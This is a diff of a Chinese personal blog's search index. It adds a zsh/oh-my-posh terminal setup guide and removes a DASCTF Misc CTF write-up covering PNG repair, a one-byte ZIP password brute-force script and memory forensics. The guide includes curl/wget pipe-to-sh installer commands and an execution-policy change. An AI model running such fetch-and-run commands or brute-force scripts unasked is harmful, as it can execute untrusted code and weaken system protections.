os.remove(imgname)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename_img</span>():</span><br><span class="line">    filenames = os.listdir(<span class="string">&quot;./final_out&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            src_img = <span class="string">&quot;./final_out/&quot;</span>+filename</span><br><span class="line">            bin_data = extract_lsb(src_img)</span><br><span class="line">            imgname = bin2img(bin_data)</span><br><span class="line">            res = read_qrcode(imgname)</span><br><span class="line">            dst_img = <span class="string">f&quot;./final_out/<span class="subst">&#123;res&#125;</span>.png&quot;</span></span><br><span class="line">            os.rename(src_img,dst_img)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;src_img&#125;</span> ===&gt; <span class="subst">&#123;dst_img&#125;</span> down!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] <span class="subst">&#123;src_img&#125;</span> Error!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge_img</span>():</span><br><span class="line">    cols = <span class="number">10</span></span><br><span class="line">    rows = <span class="number">10</span></span><br><span class="line">    img_list = []</span><br><span class="line">    new_img = Image.new(<span class="string">&quot;RGB&quot;</span>,(<span class="number">500</span>,<span class="number">500</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">        img = Image.<span class="built_in">open</span>(<span class="string">f&quot;./final_out/<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">        img_list.append(img)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">            idx = y * cols + x</span><br><span class="line">            img = img_list[idx]</span><br><span class="line">            x_offset = x * <span class="number">50</span></span><br><span class="line">            y_offset = y * <span class="number">50</span></span><br><span class="line">            new_img.paste(img,(x_offset,y_offset))</span><br><span class="line">            </span><br><span class="line">    <span class="comment"># new_img.show()</span></span><br><span class="line">    new_img.save(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># rename_img()</span></span><br><span class="line">    merge_img()</span><br></pre></td></tr></table></figure>
+<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241105145318142.png"
-                        alt="image-20241105145318142"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/8209f61b-1618-48de-8084-75189f5b1fa8.png"
+                        alt="8209f61b-1618-48de-8084-75189f5b1fa8"
                  ></p>
+<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/4bda376f-8a5f-450b-88b4-357a057b85e2.png"
+                        alt="4bda376f-8a5f-450b-88b4-357a057b85e2"
+                 ></p>
+<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/893acd65-17e9-48ab-9221-b84a454b27c0.png"
+                        alt="893acd65-17e9-48ab-9221-b84a454b27c0"
+                 ></p>
+<p>听flag即可</p>
 ]]></content>
       <categories>
         <category>题解</category>
@@ -1738,6 +1780,193 @@ hook密文，发现密文没有改变，那改变的可能是输入的flag数据
       </categories>
   </entry>
   <entry>
+    <title>记录自用的终端美化方案</title>
+    <url>//post/BeautifyBash/</url>
+    <content><![CDATA[<p><s>生产队的驴准备为自己选一个更趁手的磨盘</s>，所谓工作环境当然要赏心悦目才能更高效，下面分享一下自己在用的终端美化方案</p>
+<h2 id="WSL-Ubuntu">WSL-Ubuntu</h2>
+<p>Ubuntu自带的是bash，我认为zsh更加简洁，所以修改终端为zsh后使用oh-my-zsh主题，效果如图<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/PixPin_2024-10-09_10-25-18.png"
+                        alt="PixPin_2024-10-09_10-25-18"
+                 ></p>
+<h3 id="环境配置">环境配置</h3>
+<h4 id="安装基本工具">安装基本工具</h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更新软件源</span></span><br><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt upgrade -y</span><br><span class="line"><span class="comment"># 安装 zsh git curl</span></span><br><span class="line"><span class="built_in">sudo</span> apt install zsh git curl -y</span><br></pre></td></tr></table></figure>
+<p>设置默认终端为 zsh（<strong>注意：不要使用 sudo</strong>）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>
+<h3 id="安装-oh-my-zsh">安装 oh-my-zsh</h3>
+<p>官网：<a class="link"   href="http://ohmyz.sh/%E3%80%82" >http://ohmyz.sh/。<i class="fas fa-external-link-alt"></i></a> 安装方式任选一个即可。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">方法</th>
+<th style="text-align:left">命令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>curl</strong></td>
+<td style="text-align:left"><code>sh -c &quot;$(curl -fsSL https://install.ohmyz.sh/)&quot;</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>wget</strong></td>
+<td style="text-align:left"><code>sh -c &quot;$(wget -O- https://install.ohmyz.sh/)&quot;</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>fetch</strong></td>
+<td style="text-align:left"><code>sh -c &quot;$(fetch -o - https://install.ohmyz.sh/)&quot;</code></td>
+</tr>
+</tbody>
+</table>
+<p>注意：同意使用 Oh-my-zsh 的配置模板覆盖已有的 <code>.zshrc</code></p>
+<h3 id="配置主题">配置主题</h3>
+<p>下载完想要的主题后，编辑 <code>~/.zshrc</code> 文件，将 <code>ZSH_THEME</code> 设为 <code>你想要的主题</code>。例如<code>lukerandall</code>、<code>robbyrussell</code>。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano ~/.zshrc</span><br><span class="line"></span><br><span class="line">ZSH_THEME=<span class="string">&quot;你想要的主题&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>
+<p>我使用的是默认主题。故该部分简略带过</p>
+<h3 id="安装插件">安装插件</h3>
+<p><code>oh-my-zsh</code> 已经内置了 <code>git</code> 插件，内置插件可以在 <code>～/.oh-my-zsh/plugins</code> 中查看，下面介绍一下我常用的插件，更多插件可以在 <a class="link"   href="https://github.com/unixorn/awesome-zsh-plugins" >awesome-zsh-plugins<i class="fas fa-external-link-alt"></i></a> 里查看。</p>
+<h4 id="zsh-autosuggestions">zsh -autosuggestions</h4>
+<p><a class="link"   href="https://github.com/zsh-users/zsh-autosuggestions" >zsh-autosuggestions<i class="fas fa-external-link-alt"></i></a> 是一个命令提示插件，当你输入命令时，会自动推测你可能需要输入的命令，按下右键可以快速采用建议。效果如下：</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009103559263.png"
+                        alt="image-20241009103559263"
+                 ></p>
+<p>安装方式：把插件下载到本地的 <code>~/.oh-my-zsh/custom/plugins</code> 目录。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>
+<h4 id="zsh-syntax-highlighting">zsh-syntax-highlighting</h4>
+<p><a class="link"   href="https://github.com/zsh-users/zsh-syntax-highlighting" >zsh-syntax-highlighting<i class="fas fa-external-link-alt"></i></a> 是一个命令语法校验插件，在输入命令的过程中，若指令不合法，则指令显示为红色，若指令合法就会显示为绿色。效果如下：</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009103726396.png"
+                        alt="image-20241009103726396"
+                 ></p>
+<p>安装方式：把插件下载到本地的 <code>~/.oh-my-zsh/custom/plugins</code> 目录。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>
+<h4 id="z">z</h4>
+<p><code>oh-my-zsh</code> 内置了 <code>z</code> 插件。<code>z</code> 是一个文件夹快捷跳转插件，对于曾经跳转过的目录，只需要输入最终目标文件夹名称，就可以快速跳转，避免再输入长串路径，提高切换文件夹的效率。</p>
+<h4 id="extract">extract</h4>
+<p><code>oh-my-zsh</code> 内置了 <code>extract</code> 插件。<code>extract</code> 用于解压任何压缩文件，不必根据压缩文件的后缀名来记忆压缩软件。使用 <code>x</code> 命令即可解压文件。</p>
+<h4 id="web-search">web-search</h4>
+<p>oh-my-zsh 内置了 <code>web-search</code> 插件。<code>web-search</code> 能让我们在命令行中使用搜索引擎进行搜索。使用<code>搜索引擎关键字+搜索内容</code> 即可自动打开浏览器进行搜索。</p>
+<h3 id="启动插件">启动插件</h3>
+<p>修改<code>~/.zshrc</code>中插件列表为：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">plugins=(git zsh-autosuggestions zsh-syntax-highlighting z extract web-search)</span><br></pre></td></tr></table></figure>
+<p>部分插件需要参考插件介绍进行安装</p>
+<p>然后重启终端即可使用</p>
+<h3 id="ROOT用户启用">ROOT用户启用</h3>
+<p>重复上述步骤即可</p>
+<h2 id="Windows-PowerShell">Windows-PowerShell</h2>
+<p>使用oh-my-posh默认主题美化，效果如图</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009104518993.png"
+                        alt="image-20241009104518993"
+                 ></p>
+<h3 id="环境配置-2">环境配置</h3>
+<p>首先在Microsoft Store搜索下载oh-my-posh</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009104304519.png"
+                        alt="image-20241009104304519"
+                 ></p>
+<p>打开一个PowerShell，输入<code>$PORFILE</code>，查看配置文件所在位置</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009104438608.png"
+                        alt="image-20241009104438608"
+                 ></p>
+<p>也可以用everything直接找，如果不存在则手动创建即可</p>
+<p>在配置文件中写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\\Users\\67300\\AppData\\Local\\Programs\\oh-my-posh\\bin\\oh-my-posh.exe init pwsh --config $env:POSH_THEMES_PATH\montys.omp.json | Invoke-Expression</span><br><span class="line"></span><br><span class="line">需要自己根据情况更改，注意文件地址表示是否正确</span><br></pre></td></tr></table></figure>
+<p>随后重启终端查看配置文件能否正常运行，如果顺利则可以正常使用</p>
+<h3 id="报错处理">报错处理</h3>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009104830606.png"
+                        alt="image-20241009104830606"
+                 ></p>
+<p>以管理员身份打开一个新的终端，输入以下命令</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">start-process</span> PowerShell <span class="literal">-verb</span> runas</span><br><span class="line"></span><br><span class="line"><span class="built_in">set-executionpolicy</span> remotesigned</span><br></pre></td></tr></table></figure>
+<p>然后重启终端即可。</p>
+<p>如果遇到无法正常显示，显示为乱码或方框，则需要修改终端默认字体</p>
+<p><a class="link"   href="https://www.nerdfonts.com/font-downloads" >Nerd Fonts - Iconic font aggregator, glyphs/icons collection, &amp; fonts patcher<i class="fas fa-external-link-alt"></i></a> 在这个网站上，ctrl + F 搜索<code>JetBrainsMono Nerd Font Mono</code>，然后下载并安装该字体</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009105545990.png"
+                        alt="image-20241009105545990"
+                 ></p>
+<p>右键安装后在PowerShell中打开设置</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009105635329.png"
+                        alt="image-20241009105635329"
+                 ></p>
+<p>找到PowerShell的外观设置，<strong>这里还能进行背景图，透明度等相关设置</strong></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009110113349.png"
+                        alt="image-20241009110113349"
+                 ></p>
+<p>选择JetBrainsMono Nerd Font Mono字体并保存</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009110129639.png"
+                        alt="image-20241009110129639"
+                 ></p>
+<h3 id="修改主题">修改主题</h3>
+<p>找到oh-my-posh安装路径下的thems文件夹并打开，每一个json文件名都是一个主题，将需要的主题名复制填写到配置文件的对应位置即可。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009110243978.png"
+                        alt="image-20241009110243978"
+                 ></p>
+<h3 id="安装扩展">安装扩展</h3>
+<h4 id="安装Git扩展">安装Git扩展</h4>
+<p>posh-git 是一款专为 Windows 系统的 PowerShell 设计的 Git 扩展模块。它的主要目标是在 PowerShell 中提供更为友好、直观的 Git 命令行界面，通过整合 Git 相关的信息到命令提示符中，并提供方便快捷的键绑定，使得日常 Git 操作更为高效、直观。</p>
+<p>安装</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> <span class="literal">-Name</span> posh<span class="literal">-git</span> <span class="literal">-Scope</span> CurrentUser</span><br></pre></td></tr></table></figure>
+<p>安装完成后，重启 PowerShell 并输入以下命令启用 posh-git：<code>Import-Module posh-git</code></p>
+<p>不生效的话可以在前面的配置文件 <code>Microsoft.PowerShell_profile.ps1</code>中追加以下内容</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> posh<span class="literal">-git</span> <span class="comment"># 引入 posh-git</span></span><br></pre></td></tr></table></figure>
+<h4 id="历史命令联想">历史命令联想</h4>
+<p><code>oh-my-zsh</code> 有一个很便利的功能就是输入部分命令后、按 <code>↑</code> 或 <code>↓</code> 就可以联想历史的完整命令，其实在 <code>oh-my-posh</code> 中也能实现。</p>
+<p>首先在 <code>PowerShell</code> 执行以下命令安装插件：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> <span class="literal">-Name</span> PowerShellGet <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Install-Module</span> PSReadLine <span class="literal">-AllowPrerelease</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>
+<p>然后修改前面的配置文件 <code>Microsoft.PowerShell_profile.ps1</code>，在末尾追加以下内容：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> PSReadLine <span class="comment"># 历史命令联想</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置预测文本来源为历史记录 </span></span><br><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-PredictionSource</span> <span class="built_in">History</span> </span><br><span class="line"><span class="comment"># 设置 Tab 为菜单补全和 Intellisense </span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> <span class="string">&quot;Tab&quot;</span> <span class="literal">-Function</span> MenuComplete </span><br><span class="line"><span class="comment"># 每次回溯输入历史，光标定位于输入内容末尾 </span></span><br><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-HistorySearchCursorMovesToEnd</span> </span><br><span class="line"><span class="comment"># 设置向上键为后向搜索历史记录 </span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> UpArrow <span class="literal">-Function</span> HistorySearchBackward </span><br><span class="line"><span class="comment"># 设置向下键为前向搜索历史纪录 </span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> DownArrow <span class="literal">-Function</span> HistorySearchForward</span><br></pre></td></tr></table></figure>
+<h4 id="卸载">卸载</h4>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Uninstall-Module</span> <span class="built_in">oh</span><span class="literal">-my-posh</span> <span class="literal">-AllVersions</span></span><br></pre></td></tr></table></figure>
+<h2 id="Windows-CMD">Windows-CMD</h2>
+<p>使用clink + oh-my-posh进行美化，效果如图</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009110926127.png"
+                        alt="image-20241009110926127"
+                 ></p>
+<p>首先，安装<a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https%3A%2F%2Fgithub.com%2Fchrisant996%2Fclink%2Freleases&amp;source=article&amp;objectId=2442201" >clink<i class="fas fa-external-link-alt"></i></a>，下载exe安装包即可，然后进入 <code>clink</code> 安装目录，创建 <code>oh-my-posh.lua</code> 文件，添加如下内容：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">load(io.popen(<span class="string">&#x27;oh-my-posh init cmd&#x27;</span>):read(<span class="string">&quot;*a&quot;</span>))()</span><br></pre></td></tr></table></figure>
+<p>如果使用的是自定义主题，则添加如下内容</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">load(io.popen(<span class="string">&#x27;oh-my-posh init cmd --config C:\\Users\\&#123;你的用户名&#125;\\AppData\\Local\\Programs\\oh-my-posh\\themes\\montys.omp.json&#x27;</span>):read(<span class="string">&quot;*a&quot;</span>))()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>环境配置</category>
+      </categories>
+  </entry>
+  <entry>
     <title>使用Hexo和Github Page搭建静态博客</title>
     <url>//post/HexoBuild/</url>
     <content><![CDATA[<h4 id="一、安装准备">一、安装准备</h4>
@@ -1932,235 +2161,6 @@ hook密文，发现密文没有改变，那改变的可能是输入的flag数据
       <categories>
         <category>环境配置</category>
       </categories>
-  </entry>
-  <entry>
-    <title>DASCTF 2024暑期挑战赛 Misc部分WP</title>
-    <url>//post/DASCTF2407/</url>
-    <content><![CDATA[<h3 id="png-master">png_master</h3>
-<p><a class="link"   href="https://zh.wikipedia.org/wiki/PNG" >PNG文件结构-维基百科<i class="fas fa-external-link-alt"></i></a></p>
-<ul>
-<li><code>IDAT</code>块是储存图像数据的块，在这个块中存放在图像真正的数据信息，IDAT 块只有当上一个块充满（正常length最大65524）时，才会继续一个新的块</li>
-<li>完整的图像数据由一个单独的<code>zlib datastream</code>表示，它储存在一个<code>IDAT</code>块中</li>
-<li>一个png文件中无论有多少个<code>IDAT</code>区块，在<code>IDAT</code>块中只会出现一个<code>zlib</code>块</li>
-<li><code>789C</code>在png文件中为<code>zlib</code>的标志位</li>
-<li>一个<code>zlib</code>数据块只有一个标志位，即只会出现一次<code>789C</code></li>
-</ul>
-<p>flag第一段藏在png文件末尾，base64解码后获得<code>DASCTF&#123;2fd9e9ff-e27</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-24-09.png"
-                        alt="Clip_2024-07-23_14-24-09"
-                 ></p>
-<p>binwalk和zsteg都会提示png后有额外块，也可以使用<code>pngcheck -v</code>检查每个IDAT块是否有错误</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-34-41.png"
-                        alt="Clip_2024-07-23_14-34-41"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-35-03.png"
-                        alt="Clip_2024-07-23_14-35-03"
-                 ></p>
-<p>在010中把有问题的IDAT块复制，找一张png图片，取其文件头尾，将IDAT块复制出，作为一张新的图片，但因为宽高不知，用Puzzle Solver进行宽高爆破，得到宽高是500*500，获得flag   <code>a19131f86216&#125;</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/500X500_2_3_8.png"
-                        alt="500X500_2_3_8"
-                 ></p>
-<p>StegSlove中可以看到Alpha通道有东西</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-25-34.png"
-                        alt="Clip_2024-07-23_15-25-34"
-                 ></p>
-<p>尝试后可以找到中间段flag  <code>d-5405-c5f5-</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-26-38.png"
-                        alt="Clip_2024-07-23_15-26-38"
-                 ></p>
-<h3 id="EZ-zip">EZ_zip</h3>
-<p><a class="link"   href="https://hello-ctf.com/HC_MISC/Archivefile/#zip" >压缩包文件结构<i class="fas fa-external-link-alt"></i></a></p>
-<p>直接解压会报错，010打开模板报错，发现解压文件长度不对，可以看到<code>320.zip</code>长度应该为7（文件长度要加后缀长度），修改为7，要将文件头和目录区长度都修改</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-47-29.png"
-                        alt="Clip_2024-07-23_15-47-29"
-                 ></p>
-<p>解压后提示CRC校验错误，参照着DirEntry改动record段，可以发现是解压方法被改成了store，跟压缩方法对不上，修改解压方式</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-58-20.png"
-                        alt="Clip_2024-07-23_15-58-20"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-00-23.png"
-                        alt="Clip_2024-07-23_16-00-23"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-00-36.png"
-                        alt="Clip_2024-07-23_16-00-36"
-                 ></p>
-<p>修改后可以正常进行解压得到<code>320.zip</code>，查看压缩文件注释可以得到密码的提示<code>just a byte</code>，密码为一个字节，可以使用python进行爆破。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    zip_filename = <span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span></span><br><span class="line">    zf = pyzipper.AESZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>+<span class="number">1</span>):</span><br><span class="line">        password = j.to_bytes(length=<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        zf.setpassword(password)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zf.extractall()</span><br><span class="line">            zf.close()</span><br><span class="line">            os.remove(<span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-<p>解压得到一个txt，提示加密方法为AES-ECB，并提示key可能在前面的过程中就出现了</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-03-17.png"
-                        alt="Clip_2024-07-23_16-03-17"
-                 ></p>
-<p>联想到前面解压密码是字节形式，通过打印解压密码发现</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    zip_filename = <span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span></span><br><span class="line">    zf = pyzipper.AESZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>+<span class="number">1</span>):</span><br><span class="line">        password = j.to_bytes(length=<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        zf.setpassword(password)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zf.extractall()</span><br><span class="line">            key += password</span><br><span class="line">            zf.close()</span><br><span class="line">            os.remove(<span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(key[::-<span class="number">1</span>].<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>
-<p><code>c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11</code></p>
-<p>是循环的一个64位字符，将其当作key解密AES得到flag</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-04-42.png"
-                        alt="Clip_2024-07-23_16-04-42"
-                 ></p>
-<h3 id="ServerMeM">ServerMeM</h3>
-<p>题面信息如下</p>
-<blockquote>
-<p>公司的服务器遭受了黑客的攻击，经过勘察黑客为维持权限留下了后门，我们获取到了服务器的内存文件，请你分析黑客留下的痕迹</p>
-</blockquote>
-<p>下载附件并解压得到：out.lime、System.map</p>
-<p>在WSL中用以下命令搜索一下得到Linux内核的版本号，因此很明显就是Linux内存取证了</p>
-<blockquote>
-<p>strings mem | grep -i ‘Linux version’ | uniq</p>
-</blockquote>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923181948954.png"
-                        alt="image-20240923181948954"
-                 ></p>
-<p>本题提供两种解法，第一种是常规的通过制作Linux的符号文件来进行取证，另一种就是直接分析内存中的可疑文件</p>
-<h4 id="解法一">解法一</h4>
-<p>Linux内核版本信息如下：</p>
-<blockquote>
-<p>Linux version 5.4.27 (root@localhost.localdomain) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC)) #1 SMP Sun May 26 03:37:06 EDT 2024</p>
-</blockquote>
-<h4 id="解法二">解法二</h4>
-<p>直接在strings的结果中搜索 ”.tar.gz” 后缀的文件，发现有一个S3rCr3t.tar.gz</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182121568.png"
-                        alt="image-20240923182121568"
-                 ></p>
-<p>知道了文件名后直接在010中搜索，得到了openssl AES加密后的密文（以Salted开头）</p>
-<p>还有openssl的具体版本：1.0.2k</p>
-<p><img  
-                       lazyload
-                       alt="image"
